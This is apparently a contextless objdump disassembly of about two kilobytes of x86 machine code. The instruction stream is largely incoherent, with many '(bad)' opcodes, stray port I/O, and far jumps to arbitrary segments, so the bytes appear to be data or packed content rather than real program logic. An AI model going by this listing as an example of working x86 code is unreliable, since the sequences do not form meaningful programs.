  41118a:	lods   al,BYTE PTR ds:[esi]
  41118b:	jne    0x4111ca
  41118d:	add    DWORD PTR [ebp-0x69],0xffffffba
  411191:	push   0x8773d085
  411196:	jne    0x411205
  411198:	out    dx,eax
  411199:	push   cs
  41119a:	sbb    ecx,ecx
  41119c:	jecxz  0x411204
  41119e:	add    al,0x1a
  4111a0:	imul   eax,DWORD PTR gs:[edx+edi*8+0x726d27ac],0x2a990515
  4111ac:	out    0x86,eax
  4111ae:	pop    edi
  4111af:	mov    ch,ch
  4111b1:	mov    eax,DWORD PTR [edi+eax*1]
  4111b4:	push   edi
  4111b5:	test   al,0x57
  4111b7:	pop    ebx
  4111b8:	jl     0x4111be
  4111ba:	rol    DWORD PTR [edi+0x5f],cl
  4111bd:	jnp    0x411180
  4111bf:	push   0xbfa58121
  4111c4:	xlat   BYTE PTR ds:[ebx]
  4111c5:	outs   dx,BYTE PTR ds:[esi]
  4111c6:	xor    BYTE PTR [edx-0x6e9eb205],bl
  4111cc:	pop    es
  4111cd:	sub    eax,0x426b359
  4111d2:	mov    edx,0x10c42f53
  4111d7:	inc    eax
  4111d8:	pop    esp
  4111d9:	cli    
  4111da:	imul   ecx,DWORD PTR cs:[edi],0x91f68b1e
  4111e1:	arpl   WORD PTR [eax-0x4583038d],di
  4111e7:	jmp    0x86db:0x3b9e4879
  4111ee:	and    BYTE PTR [edx-0x1],ah
  4111f1:	es cwde 
  4111f3:	mov    bl,BYTE PTR [edx+0x23c3bd05]
  4111f9:	pop    edx
  4111fa:	push   ecx
  4111fb:	data16 xor al,0x3f
  4111fe:	inc    esp
  4111ff:	adc    DWORD PTR [edi+0x69],edx
  411202:	mov    ds:0x82a8beef,eax
  411207:	(bad)  
  411208:	stos   DWORD PTR es:[edi],eax
  411209:	imul   edx,ecx,0x4e5baca0
  41120f:	xchg   edi,eax
  411210:	sub    eax,0x6a98b0fc
  411215:	or     DWORD PTR [ecx],ebx
  411217:	sbb    ah,cl
  411219:	or     al,0xfc
  41121b:	in     al,0x2f
  41121d:	push   0x1a
  41121f:	test   eax,0xb2959bc7
  411224:	enter  0x8513,0x2e
  411228:	(bad)  
  411229:	jmp    0x634cb44d
  41122e:	icebp  
  41122f:	push   0x4e
  411231:	jns    0x411247
  411233:	pop    edx
  411234:	fmul   DWORD PTR [edi]
  411236:	xchg   edi,eax
  411237:	and    edx,DWORD PTR [eax+0x37]
  41123a:	(bad)  
  41123b:	out    dx,eax
  41123c:	out    0xe6,eax
  41123e:	ret    0xfac1
  411241:	push   edi
  411242:	xor    ch,ch
  411244:	mov    ebp,0x2fbad14a
  411249:	push   ecx
  41124a:	loope  0x41123a
  41124c:	jmp    0x6eca:0x28421ae2
  411253:	jp     0x4112d4
  411255:	jg     0x41122d
  411257:	pop    ebx
  411258:	cmp    eax,0xf8b3f716
  41125d:	call   0xb384:0x2f8272dd
  411264:	mov    ecx,ecx
  411266:	mov    esi,0xeedadfb
  41126b:	xchg   esp,eax
  41126c:	(bad)  
  41126d:	ficom  WORD PTR [ebx+0x1ebbd072]
  411273:	cmp    al,0x45
  411275:	jmp    0x411222
  411277:	pop    esi
  411278:	test   DWORD PTR [eax+0x3d1d7bab],edx
  41127e:	out    dx,al
  41127f:	stos   DWORD PTR es:[edi],eax
  411280:	push   ecx
  411281:	adc    ecx,esi
  411283:	pop    edi
  411284:	xor    al,0xac
  411286:	mov    DWORD PTR [edi],0x5f007138
  41128c:	pop    ss
  41128d:	push   ds
  41128e:	and    BYTE PTR [eax],ah
  411290:	mov    al,ds:0xe968c5a0
  411295:	jnp    0x4112c9
  411297:	rcr    BYTE PTR [edx+0x147f9fa6],1
  41129d:	sbb    BYTE PTR [esi],dl
  41129f:	inc    ebp
  4112a0:	imul   ebp,DWORD PTR [esp+ebp*2-0x63e42e7f],0xffffff81
  4112a8:	jl     0x411275
  4112aa:	je     0x41131f
  4112ac:	data16 xor al,0x60
  4112af:	mov    al,0x49
  4112b1:	mov    ecx,0x88203077
  4112b6:	dec    edx
  4112b7:	and    DWORD PTR cs:[esi-0x782925f8],ebp
  4112be:	sbb    edi,ecx
  4112c0:	push   ebp
  4112c1:	jl     0x411258
  4112c3:	mov    ds:0x6df0d01d,eax
  4112c8:	inc    edi
  4112c9:	std    
  4112ca:	adc    DWORD PTR [ebx-0x23017925],esi
  4112d0:	or     DWORD PTR [edx+0x55],eax
  4112d3:	std    
  4112d4:	out    dx,al
  4112d5:	jecxz  0x411290
  4112d7:	adc    DWORD PTR [edi+0x36],0xc009de62
  4112de:	or     al,BYTE PTR [eax]
  4112e0:	fnstsw WORD PTR [eax+0x35]
  4112e3:	add    BYTE PTR [ecx+esi*4-0x5d222afb],bl
  4112ea:	mov    eax,0xb15b2e10
  4112ef:	test   eax,0xbb748b23
  4112f4:	nop
  4112f5:	cmp    BYTE PTR [esp+edi*4],cl
  4112f8:	lea    eax,[esi+0x5a549710]
  4112fe:	add    eax,0x188c3157
  411303:	aad    0x29
  411305:	mov    WORD PTR [edx-0x6a],ds
  411308:	mov    esi,0xee2f01d2
  41130d:	dec    esi
  41130e:	mov    ds:0xc66470f7,al
  411313:	cmp    dl,dl
  411315:	mov    esp,fs
  411317:	pop    ebx
  411318:	(bad)  
  411319:	popa   
  41131a:	nop
  41131b:	test   DWORD PTR [eax-0x51],esp
  41131e:	test   al,0x9a
  411320:	std    
  411321:	in     al,0x8d
  411323:	jecxz  0x4112d4
  411325:	idiv   DWORD PTR [ebp+0x7d6e1bea]
  41132b:	sbb    eax,0x7a05a7bd
  411330:	dec    ebx
  411331:	add    ebp,DWORD PTR [eax+ebx*8-0x20]
  411335:	data16 test BYTE PTR [ebp-0x3390626b],dh
  41133c:	or     al,0xf0
  41133e:	pop    edi
  41133f:	(bad)  [ebp+edi*8-0x5def020f]
  411346:	add    esi,DWORD PTR [edx]
  411348:	imul   edx,esp,0x61
  41134b:	ins    DWORD PTR es:[edi],dx
  41134c:	jmp    0x565117cc
  411351:	sub    al,0xab
  411353:	and    dh,dh
  411355:	sub    eax,0xb57f990f
  41135a:	xchg   ebp,eax
  41135b:	xor    DWORD PTR [ebx+0x182991fc],edx
  411361:	cmp    DWORD PTR [ecx-0x39],edx
  411364:	inc    esi
  411365:	ja     0x411352
  411367:	adc    BYTE PTR [ecx+0x51],bl
  41136a:	std    
  41136b:	xchg   ebp,eax
  41136c:	fisubr DWORD PTR [esi]
  41136e:	xchg   edi,eax
  41136f:	pop    esp
  411370:	inc    esi
  411371:	les    esp,FWORD PTR [eax-0x6f10deaa]
  411377:	mov    ch,0xc
  411379:	pop    esp
  41137a:	cmp    BYTE PTR [edx-0x7245c106],ah
  411380:	mov    eax,ds:0x8f5ec7b4
  411385:	mov    edi,0xbdf62072
  41138a:	xchg   ebx,eax
  41138b:	leave  
  41138c:	jge    0x4113c6
  41138e:	add    ah,al
  411390:	mov    ebp,DWORD PTR [edi+0x2f2d792f]
  411396:	jmp    0xb15d:0xce498bb1
  41139d:	in     eax,0x5
  41139f:	sti    
  4113a0:	ss enter 0xbba2,0xca
  4113a5:	nop
  4113a6:	xor    al,0xf
  4113a8:	mov    gs:0xe8708574,al
  4113ae:	push   ds
  4113af:	call   0x41b6:0x6bc9bc1e
  4113b6:	mov    ds:0xa2a5e387,al
  4113bb:	mov    ah,0x9f
  4113bd:	push   eax
  4113be:	sbb    dl,0xce
  4113c1:	mov    eax,0xdab7943d
  4113c6:	sbb    DWORD PTR [eax+0x2d],ebx
  4113c9:	fld    QWORD PTR [eax+0x43e75f69]
  4113cf:	and    BYTE PTR [ebx+0x6c],dh
  4113d2:	jnp    0x411413
  4113d4:	out    0x67,eax
  4113d6:	fcom   QWORD PTR [ecx]
  4113d8:	add    esp,DWORD PTR [edi-0x66a9587a]
  4113de:	mov    ecx,0x84280e2f
  4113e3:	addr16 push eax
  4113e5:	mov    al,ds:0x6fb979b3
  4113ea:	cwde   
  4113eb:	je     0x411376
  4113ed:	mov    dh,BYTE PTR [eax]
  4113ef:	inc    esi
  4113f0:	xchg   ebx,eax
  4113f1:	(bad)  
  4113f2:	repnz inc esp
  4113f4:	in     al,0xa6
  4113f6:	mov    eax,ds:0x49a02125
  4113fb:	cdq    
  4113fc:	(bad)
  411400:	add    DWORD PTR [ecx],0xeab4f04c
  411406:	cs push ebp
  411408:	aaa    
  411409:	sbb    ecx,DWORD PTR [ecx-0x1f]
  41140c:	xchg   esp,eax
  41140d:	inc    eax
  41140e:	dec    ebp
  41140f:	scas   al,BYTE PTR es:[edi]
  411410:	dec    ebp
  411411:	jae    0x411455
  411413:	mov    esp,0x9783a2e
  411418:	clc    
  411419:	push   esi
  41141a:	lea    esi,[esp+esi*4]
  41141d:	add    ecx,DWORD PTR [ebp-0x1]
  411420:	sub    DWORD PTR [ecx-0x3ac7034e],esp
  411426:	push   ecx
  411427:	push   ds
  411428:	inc    eax
  411429:	mov    ds:0xda822635,al
  41142e:	cdq    
  41142f:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  411430:	gs mov esi,0xc18a23a9
  411436:	mov    edx,0xb37f624b
  41143b:	inc    edx
  41143c:	aam    0xe3
  41143e:	sub    eax,0x20c266d0
  411443:	jg     0x4114bd
  411445:	mov    bl,0xf5
  411447:	call   0x4769:0x6bf8b009
  41144e:	(bad)  
  41144f:	push   esp
  411450:	repz mov edi,?
  411453:	retf   
  411454:	dec    ecx
  411455:	lds    esp,FWORD PTR [edi+ebp*8-0x5f]
  411459:	gs aas 
  41145b:	out    0xb2,al
  41145d:	fist   WORD PTR ds:0x659c36a4
  411463:	mov    al,gs:0xc7e4c380
  411469:	pop    eax
  41146a:	outs   dx,DWORD PTR ds:[esi]
  41146b:	pop    DWORD PTR [ebx+0xf]
  41146e:	nop
  41146f:	and    al,0x7c
  411471:	std    
  411472:	nop
  411473:	sbb    dh,BYTE PTR [esi]
  411475:	neg    BYTE PTR ds:0x771da326
  41147b:	xor    eax,DWORD PTR [edx+0x6baedfa5]
  411481:	iret   
  411482:	mul    BYTE PTR ds:0xa48e8d6a
  411488:	addr16 sbb eax,0x955604dd
  41148e:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41148f:	shr    BYTE PTR [edx],cl
  411491:	scas   eax,DWORD PTR es:[edi]
  411492:	or     eax,0xa397c67b
  411497:	fild   DWORD PTR [ecx+0x486e04fe]
  41149d:	dec    ebx
  41149e:	test   al,0x82
  4114a0:	pop    esp
  4114a1:	dec    ebp
  4114a2:	push   cs
  4114a3:	jmp    0x4114b7
  4114a5:	xchg   ebx,eax
  4114a6:	(bad)  
  4114a7:	jo     0x411472
  4114a9:	mov    al,ds:0xf757c359
  4114ae:	xchg   edi,eax
  4114af:	jo     0x41151f
  4114b1:	test   al,0xd6
  4114b3:	mov    bl,0x94
  4114b5:	sbb    edi,esp
  4114b7:	or     cl,BYTE PTR [edx]
  4114b9:	ret    0xbbde
  4114bc:	sub    ah,cl
  4114be:	cmp    esp,0x52
  4114c1:	mov    cl,0x44
  4114c3:	outs   dx,DWORD PTR ds:[esi]
  4114c4:	add    eax,0xc2d1d685
  4114c9:	and    edx,DWORD PTR [edi+ebx*1+0x3a]
  4114cd:	scas   al,BYTE PTR es:[edi]
  4114ce:	cmp    esp,ecx
  4114d0:	call   FWORD PTR [edx]
  4114d2:	jge    0x41147d
  4114d4:	scas   al,BYTE PTR es:[edi]
  4114d5:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  4114d6:	sbb    bl,BYTE PTR [eax-0x41]
  4114d9:	lock mov edx,0x19e90db1
  4114df:	ds mov ah,0x3
  4114e2:	jne    0x411479
  4114e4:	adc    edi,0xb4471344
  4114ea:	ficom  DWORD PTR ds:0x20076cad
  4114f0:	popf   
  4114f1:	pusha  
  4114f2:	jae    0x411517
  4114f4:	dec    edx
  4114f5:	add    al,0xf0
  4114f7:	jbe    0x411535
  4114f9:	xor    DWORD PTR [eax-0x6d],edx
  4114fc:	xchg   ebx,eax
  4114fd:	in     al,dx
  4114fe:	adc    BYTE PTR [ecx+0x53],al
  411501:	int3   
  411502:	jae    0x41156e
  411504:	push   0xb986490b
  411509:	cmp    DWORD PTR [ecx+eax*2+0x13],edi
  41150d:	cmp    al,0x5c
  41150f:	xchg   ebp,eax
  411510:	scas   al,BYTE PTR es:[edi]
  411511:	push   0x8db8bf58
  411516:	into   
  411517:	pop    esp
  411518:	xchg   edi,eax
  411519:	sar    BYTE PTR [ecx],cl
  41151b:	push   ebp
  41151c:	sub    BYTE PTR [ebp+0x3d35825a],0xe9
  411523:	stc    
  411524:	xor    DWORD PTR [ebx],ebx
  411526:	mov    ebp,0x412f619
  41152b:	ficom  WORD PTR [eax]
  41152d:	fwait
  41152e:	push   esi
  41152f:	lods   al,BYTE PTR ds:[esi]
  411530:	arpl   WORD PTR [esi+eax*8+0x3e3d125b],si
  411537:	sub    DWORD PTR ds:0x6ed1b0c9,esp
  41153d:	dec    esi
  41153e:	xchg   DWORD PTR [eax+esi*2-0x34],edi
  411542:	fcmove st,st(3)
  411544:	scas   al,BYTE PTR es:[edi]
  411545:	test   al,0x55
  411547:	pop    edx
  411548:	push   0xa7a9f99c
  41154d:	cmp    BYTE PTR [eax+edi*2+0x76],0x98
  411552:	and    eax,0x6c7c88db
  411557:	adc    bh,BYTE PTR [ebx+edx*2-0x44]
  41155b:	jnp    0x41157a
  41155d:	call   0x6caa:0x6369d796
  411564:	loopne 0x4115b3
  411566:	push   0x5037b280
  41156b:	sahf   
  41156c:	mov    cl,0x5c
  41156e:	push   ecx
  41156f:	push   edx
  411570:	mov    fs,WORD PTR [esi+edi*8-0x71]
  411574:	sti    
  411575:	aad    0x62
  411577:	(bad)  
  411578:	cmc    
  411579:	mov    esi,0xd8802172
  41157e:	outs   dx,BYTE PTR ds:[esi]
  41157f:	mov    dl,0x50
  411581:	pop    es
  411582:	sti    
  411583:	add    BYTE PTR [edx+0x2c],ch
  411586:	adc    ah,ah
  411588:	cmp    edx,DWORD PTR [edi+0x2333d557]
  41158e:	mov    DWORD PTR [ecx+esi*4-0xef098dc],esp
  411595:	retf   
  411596:	fcom   DWORD PTR [ebp*1-0x1b83c4d8]
  41159d:	mov    ecx,0x8d9fd7ad
  4115a2:	xor    dh,bh
  4115a4:	sbb    eax,0xccb66380
  4115a9:	mov    ds:0xe1fb579d,eax
  4115ae:	jb     0x411567
  4115b0:	mov    BYTE PTR [esp+ebx*2],ah
  4115b3:	xchg   edi,eax
  4115b4:	jns    0x411548
  4115b6:	xchg   ecx,eax
  4115b7:	xor    eax,0xbbd6450f
  4115bc:	adc    DWORD PTR [ecx-0x1],esi
  4115bf:	add    eax,0xb9dd6f11
  4115c4:	push   cs
  4115c5:	xor    edx,DWORD PTR [ebp-0x75]
  4115c8:	sbb    eax,0x3bdd4f88
  4115cd:	test   edi,eax
  4115cf:	push   ds
  4115d0:	add    al,0x9d
  4115d2:	sbb    al,0x17
  4115d4:	xchg   edx,eax
  4115d5:	jnp    0x4115a7
  4115d7:	aad    0x39
  4115d9:	fidiv  WORD PTR ds:[ebx-0x20b2cb52]
  4115e0:	mov    esi,0x89dba1fc
  4115e5:	scas   eax,DWORD PTR es:[edi]
  4115e6:	xchg   esi,eax
  4115e7:	test   ch,cl
  4115e9:	test   eax,0x5a39c86d
  4115ee:	or     edi,DWORD PTR [eax+0x20dbe429]
  4115f4:	ror    BYTE PTR [eax-0x44ac6c84],1
  4115fa:	jbe    0x411645
  4115fc:	scas   al,BYTE PTR es:[edi]
  4115fd:	mov    BYTE PTR [ecx-0x7b833322],ch
  411603:	sub    DWORD PTR [ebx-0xbb77e7c],ecx
  411609:	sbb    al,0x10
  41160b:	jns    0x411593
  41160d:	(bad)  
  41160e:	popa   
  41160f:	hlt    
  411610:	add    esi,esi
  411612:	mov    al,ds:0xcda0e391
  411617:	out    dx,al
  411618:	xchg   DWORD PTR [edx+0x76da47f5],eax
  41161e:	frstor [ebp+0x10]
  411621:	pop    ebp
  411622:	arpl   WORD PTR [ecx],si
  411624:	pop    ds
  411625:	xchg   ebx,eax
  411626:	fdivr  st,st(2)
  411629:	push   cs
  41162a:	mov    edi,0x681ea234
  41162f:	pop    ecx
  411630:	dec    esp
  411631:	sub    al,0x4c
  411634:	xor    eax,0x21d9772c
  411639:	inc    ecx
  41163a:	into   
  41163b:	xchg   ebx,eax
  41163c:	mov    al,0x7e
  41163e:	sub    bh,BYTE PTR [ebx]
  411640:	cmc    
  411641:	dec    ecx
  411642:	shl    DWORD PTR [esi+0x22],cl
  411645:	ret    
  411646:	push   edx
  411647:	jl     0x411607
  411649:	aam    0xc5
  41164b:	in     al,dx
  41164c:	or     BYTE PTR [esi],0x30
  41164f:	jae    0x411635
  411651:	fwait
  411652:	test   eax,0x4f2fce38
  411657:	out    0x3f,al
  411659:	mov    cs,WORD PTR [edi+edx*4]
  41165c:	jle    0x4116a0
  41165e:	mov    ah,0x2d
  411660:	in     eax,0xa5
  411662:	imul   ecx,DWORD PTR [edi+eiz*8-0x374dae7],0xffffffbd
  41166a:	jb     0x4116b1
  41166c:	sub    BYTE PTR [edx-0x24e45934],dl
  411672:	mov    al,0xe3
  411674:	(bad)
  411677:	mov    bh,BYTE PTR [ebx]
  411679:	push   0xc4f6fc35
  41167e:	cmp    BYTE PTR [ecx],0x36
  411681:	fild   WORD PTR [edx-0x7b8f4109]
  411687:	mov    eax,0xacaa46e6
  41168c:	popf   
  41168d:	loop   0x4116d8
  41168f:	dec    DWORD PTR [ebx]
  411691:	xor    BYTE PTR [esi],cl
  411693:	loopne 0x41165f
  411695:	dec    edi
  411696:	pop    edx
  411697:	outs   dx,DWORD PTR ds:[esi]
  411698:	cmp    DWORD PTR es:[ecx+0x5],esi
  41169c:	out    0x30,al
  41169e:	sbb    edx,DWORD PTR [edx+0x15a2d80a]
  4116a4:	mov    ecx,0xfe45bf6b
  4116a9:	hlt    
  4116aa:	ds dec esp
  4116ac:	mov    dh,0xbb
  4116ae:	mov    al,0xf3
  4116b0:	stos   DWORD PTR es:[edi],eax
  4116b1:	adc    cl,ah
  4116b3:	(bad)
  4116b6:	inc    ebx
  4116b7:	ss jmp 0x411739
  4116ba:	dec    ecx
  4116bb:	sti    
  4116bc:	and    BYTE PTR [eax],0xb2
  4116bf:	xor    eax,0x6bf67939
  4116c4:	pushf  
  4116c5:	fcom   QWORD PTR [ecx+0x22da5555]
  4116cb:	ret    0x20b2
  4116ce:	jle    0x411676
  4116d0:	in     eax,0x5
  4116d2:	jg     0x411728
  4116d4:	in     eax,0xf2
  4116d6:	retf   
  4116d7:	push   esp
  4116d8:	ss mov dh,0x37
  4116db:	add    cl,BYTE PTR ds:0xec68c58a
  4116e1:	fsubr  QWORD PTR ds:0x4384e24f
  4116e7:	inc    esi
  4116e8:	mov    dh,0xc1
  4116ea:	or     eax,0xa0ee405a
  4116ef:	add    DWORD PTR [edx+0x15f42298],eax
  4116f5:	clc    
  4116f6:	inc    edi
  4116f7:	mov    ebx,DWORD PTR [ebp-0xda0bdf5]
  4116fd:	push   ebx
  4116fe:	mov    al,ds:0x53762d52
  411703:	ins    DWORD PTR es:[edi],dx
  411704:	(bad)  
  411705:	jae    0x411760
  411707:	mov    esi,0x265df85c
  41170c:	(bad)  
  41170d:	xchg   esi,eax
  41170e:	push   0xcc9c1539
  411713:	out    dx,eax
  411714:	pop    ds
  411715:	es clc 
  411717:	mov    eax,0xad2f931c
  41171c:	pop    edx
  41171d:	xor    eax,0xc25f147b
  411722:	stc    
  411723:	mov    esi,0x7cfa51fb
  411728:	sahf   
  411729:	ins    DWORD PTR es:[edi],dx
  41172a:	loop   0x411709
  41172c:	loopne 0x4116e9
  41172e:	mov    dh,BYTE PTR [edx+0x467d779a]
  411734:	mov    edx,edx
  411736:	lahf   
  411737:	mov    ah,0xe1
  411739:	dec    ecx
  41173a:	test   eax,0x101c003c
  41173f:	pop    edx
  411740:	jo     0x4116ed
  411742:	rcl    DWORD PTR [edx-0x3a48c52a],0x10
  411749:	out    0xf8,eax
  41174b:	in     eax,dx
  41174c:	inc    esi
  41174d:	aam    0x9
  41174f:	sbb    dh,al
  411751:	and    eax,0xd823ba46
  411756:	es dec ebx
  411758:	push   0x12d1bb67
  41175d:	(bad)  
  41175e:	sub    al,BYTE PTR [ebx+ebx*4]
  411761:	imul   edi,DWORD PTR [edx-0x32],0x440ce62f
  411768:	cmp    dl,dh
  41176a:	sub    DWORD PTR [ebp-0x5f7e0947],0x419b0fd5
  411774:	(bad)  {k5}
  411779:	cdq    
  41177a:	repnz into 
  41177c:	xchg   ebp,eax
  41177d:	jle    0x41176a
  41177f:	mov    dl,BYTE PTR [edx]
  411781:	mov    cl,0x20
  411783:	jp     0x411728
  411785:	and    BYTE PTR cs:[esi],ah
  411788:	aas    
  411789:	add    BYTE PTR [ecx+0x487b7712],bh
  41178f:	jno    0x411805
  411791:	pop    edx
  411792:	sub    eax,0x282c5f2
  411797:	cli    
  411798:	adc    DWORD PTR [esi],ecx
  41179a:	mov    ds:0xf15cc695,al
  41179f:	paddd  mm6,QWORD PTR [eax+ebp*2]
  4117a3:	pop    es
  4117a4:	push   ecx
  4117a5:	and    bl,BYTE PTR [ebx+ebx*2-0x3]
  4117a9:	push   ebp
  4117aa:	mov    gs,WORD PTR [eax-0x2731be14]
  4117b0:	inc    esp
  4117b1:	mov    ecx,0x23bdc03e
  4117b6:	test   DWORD PTR [edx+ebp*4+0xe],ebx
  4117ba:	fadd   QWORD PTR [edx]
  4117bc:	cld    
  4117bd:	stc    
  4117be:	cld    
  4117bf:	sub    al,0x64
  4117c1:	xor    ah,dl
  4117c3:	pop    ecx
  4117c4:	adc    dh,BYTE PTR [edx+0x5a]
  4117c7:	das    
  4117c8:	cmc    
  4117c9:	nop
  4117ca:	lea    ebp,[edi]
  4117cc:	mov    eax,ds:0x8a72c3f5
  4117d1:	cs test bl,dh
  4117d4:	out    dx,al
  4117d5:	or     ecx,edx
  4117d7:	pop    ebx
  4117d8:	test   al,0xe1
  4117da:	jb     0x4117a6
  4117dc:	inc    eax
  4117dd:	ins    DWORD PTR es:[edi],dx
  4117de:	ret    0x6ab4
  4117e1:	das    
  4117e2:	xchg   ecx,eax
  4117e3:	jae    0x4117ee
  4117e5:	push   edi
  4117e6:	ins    DWORD PTR es:[edi],dx
  4117e7:	mov    cl,0xb5
  4117e9:	hlt    
  4117ea:	jp     0x41180a
  4117ec:	fisub  WORD PTR [edi]
  4117ee:	inc    edi
  4117ef:	lods   al,BYTE PTR ds:[esi]
  4117f0:	sbb    dl,bl
  4117f2:	in     eax,dx
  4117f3:	(bad)  
  4117f4:	popa   
  4117f5:	mov    eax,ds:0xfcc20079
  4117fa:	xor    bl,ah
  4117fc:	mov    edi,0x179b65c7
  411801:	sub    eax,0xf7af0e2d
  411806:	ss pop ebx
  411808:	(bad)  
  411809:	iret   
  41180a:	mov    esp,0xf8ef2294
  41180f:	retf   0xf417
  411812:	add    al,0xb4
  411814:	es push ss
  411816:	jne    0x4117cc
  411818:	adc    ebx,DWORD PTR [esi]
  41181a:	add    ecx,0x7de1e63a
  411820:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  411821:	xchg   edx,eax
  411822:	jle    0x411805
  411824:	jno    0x4117f6
  411826:	mul    DWORD PTR [edi-0x40]
  411829:	adc    DWORD PTR [eax-0x1d],0x9a392b46
  411830:	sub    DWORD PTR [ecx+0x2e],0x6
  411834:	mov    al,ds:0x8f68810b
  411839:	lods   al,BYTE PTR ds:[esi]
  41183a:	jae    0x411874
  41183c:	(bad)  
  41183d:	in     al,0x36
  41183f:	sbb    edi,DWORD PTR [edi-0x2d]
  411842:	icebp  
  411843:	dec    esp
  411844:	fs (bad) 
  411847:	popf   
  411848:	in     eax,0xc
  41184a:	repz jle 0x41188c
  41184d:	mov    ebp,0x309b343a
  411852:	outs   dx,BYTE PTR ds:[esi]
  411853:	adc    BYTE PTR ds:0x7953b391,dh
  411859:	sub    ecx,DWORD PTR [eax-0x55]
  41185c:	mov    ds:0x796208ab,eax
  411861:	sub    al,0xd8
  411863:	mov    eax,ecx
  411865:	xor    al,0xc1
  411867:	cmc    
  411868:	sub    DWORD PTR [eax*1+0x66135744],0x1f5144d4
  411873:	in     al,0xb0
  411875:	(bad)  
  411876:	dec    ecx
  411877:	xchg   BYTE PTR [edx+0x66],al
  41187a:	add    cl,BYTE PTR [edi+0x6ae81691]
  411880:	sahf   
  411881:	scas   al,BYTE PTR es:[edi]
  411882:	pop    ebx
  411883:	js     0x411835
  411885:	pop    esp
  411886:	outs   dx,BYTE PTR ds:[esi]
  411887:	push   edi
  411888:	in     al,dx
  411889:	push   ds
  41188a:	je     0x41188e
  41188c:	fdiv   DWORD PTR [esi+0x53]
  41188f:	stos   BYTE PTR es:[edi],al
  411890:	mov    dh,0x9d
  411892:	adc    DWORD PTR [ebp-0x33e3ebaa],ebp
  411898:	jl     0x4118c5
  41189a:	test   BYTE PTR [edx+ebx*8+0x46],ch
  41189e:	pop    ebx
  41189f:	dec    eax
  4118a0:	ins    DWORD PTR es:[edi],dx
  4118a1:	xchg   edx,eax
  4118a2:	and    BYTE PTR [ebp-0x7e],al
  4118a5:	(bad)  
  4118a7:	in     al,0xec
  4118a9:	add    DWORD PTR [ecx+0x7c5d6e98],esp
  4118af:	pop    ecx
  4118b0:	ins    BYTE PTR es:[edi],dx
  4118b1:	mov    edx,0x878fcecf
  4118b6:	retf   
  4118b7:	leave  
  4118b8:	ror    BYTE PTR [ebp-0x59],1
  4118bb:	mov    al,ds:0x4ea0ce7b
  4118c0:	aaa    
  4118c1:	icebp  
  4118c2:	push   esp
  4118c3:	or     esp,ecx
  4118c5:	mov    eax,0xf89c69bf
  4118ca:	adc    esp,DWORD PTR ds:[ebx]
  4118cd:	sub    DWORD PTR [esi+0x51],0xcbfc6fd5
  4118d4:	lahf   
  4118d5:	mov    bl,0xb9
  4118d7:	aam    0x8e
  4118d9:	stc    
  4118da:	(bad)  
  4118db:	mov    gs:0x9d2d88ee,eax
  4118e1:	rcr    ebp,0xb0
  4118e4:	jbe    0x41195d
  4118e6:	mov    al,ds:0xef088b2f
  4118eb:	xor    DWORD PTR [ecx],ebp
  4118ed:	mov    WORD PTR [edx+0x30dc1769],gs
  4118f3:	jbe    0x411950
  4118f5:	out    0xb1,eax
  4118f7:	std    
  4118f8:	add    al,0x23
  4118fa:	scas   al,BYTE PTR es:[edi]
  4118fb:	(bad)  
  4118fd:	ret    
  4118fe:	mov    esi,0xa62908d5
  411903:	pop    ebx
  411904:	int3   
  411905:	jns    0x41191e
  411907:	jg     0x41191b
  411909:	push   0x60
  41190b:	(bad)  
  41190c:	lods   eax,DWORD PTR ds:[esi]
  41190d:	xchg   esp,eax
  41190e:	lods   al,BYTE PTR ds:[esi]
  41190f:	mov    ?,WORD PTR [ebx+ecx*8+0x4f]
  411913:	jmp    DWORD PTR [esi-0x288719]
  411919:	mov    edi,0x562d1a56
  41191e:	ret    0x5195
  411921:	fdiv   DWORD PTR [ebp-0x4e25991]
  411927:	push   ebx
  411928:	push   ds
  411929:	or     al,0xaa
  41192b:	pop    edi
  41192c:	push   esp
  41192d:	out    dx,al
  41192e:	xor    BYTE PTR [ecx],cl
  411930:	dec    edi
  411931:	sub    BYTE PTR [eax+0x60da762b],0x3c
  411938:	cwde   
  411939:	je     0x4118e5
  41193b:	cmp    al,0xa2
  41193d:	ss das 
  41193f:	stos   DWORD PTR es:[edi],eax
  411940:	daa    
  411941:	fild   WORD PTR [edx-0x6f]
  411944:	fcmovbe st,st(0)
  411946:	stos   DWORD PTR es:[edi],eax
  411947:	mov    ebx,0x9516a050
  41194c:	sub    ah,ah
  41194e:	out    0x74,al
  411950:	lahf   
  411951:	std    
  411952:	mov    dh,0x9e
  411954:	mov    ds:0x12844908,eax
  411959:	movs   BYTE PTR es:[edi],BYTE PTR es:[esi]
  41195b:	mov    al,BYTE PTR [ecx-0x75]
  41195e:	sub    al,0xfd
  411960:	imul   edi,esp,0x5a24c521
  411966:	rcl    esp,0xbe
  411969:	retf   
  41196a:	in     eax,dx
  41196b:	push   esp
  41196c:	mov    DWORD PTR [eax+0x5],edx
  41196f:	pop    esi
  411970:	cdq    
  411971:	int3   
  411972:	mov    al,ds:0xb7484b50
  411977:	test   DWORD PTR [edx-0x5eded7b1],edi
  41197d:	pop    es
  41197e:	in     eax,dx
  41197f:	jne    0x411949
  411981:	sti    
  411982:	aad    0xec
  411984:	or     dl,bl
  411986:	pop    edi
  411987:	xchg   esp,eax
  411988:	jbe    0x411a07
  41198a:	lds    eax,FWORD PTR [esi+ebp*4]
  41198d:	mov    edi,0x47e86e16
  411992:	mov    ebp,0xf448231b
  411997:	push   esp
  411998:	xchg   ebx,eax
  411999:	jnp    0x41197c
  41199b:	pop    ss
  41199c:	add    eax,0x654c538d
  4119a1:	mov    dh,0xff
  4119a3:	adc    ebx,edx
  4119a5:	mov    ecx,0x9f817f77
  4119aa:	fwait
  4119ab:	cwde   
  4119ac:	adc    eax,0xf0b91d42
  4119b1:	xchg   edx,eax
  4119b2:	pop    ebp
  4119b3:	sahf   
  4119b4:	jl     0x4119a0
  4119b6:	repnz les eax,FWORD PTR [edi-0x3b042e7e]
  4119bd:	cmp    ch,BYTE PTR [ecx-0x4a]
  4119c0:	and    eax,0xe8fa3ff1
  4119c5:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  4119c6:	push   edx
  4119c7:	xchg   ebx,eax
  4119c8:	add    eax,DWORD PTR [esp+ebx*1-0x4be8a9c1]
  4119cf:	jle    0x411960
  4119d1:	rol    DWORD PTR [edi-0x2846045f],1
  4119d7:	adc    ebx,DWORD PTR [esi+0x0]
  4119da:	push   ecx
  4119db:	pop    ebp
